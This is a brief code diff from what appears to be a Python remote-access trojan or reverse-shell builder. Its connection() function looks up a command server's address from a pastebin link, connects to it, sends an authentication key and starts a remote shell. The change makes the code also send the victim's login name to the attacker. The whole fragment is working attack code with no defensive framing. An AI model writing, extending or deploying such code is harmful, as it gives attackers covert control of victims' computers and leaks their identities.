@@ -612,7 +612,7 @@ def connection():
             cred = get('$pastebin')
             sp = cred.text.split(':')
             s.connect((sp[0], int(sp[1])))
-            s.send('$key'.encode())
+            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
             shell()
             s.close()
             break
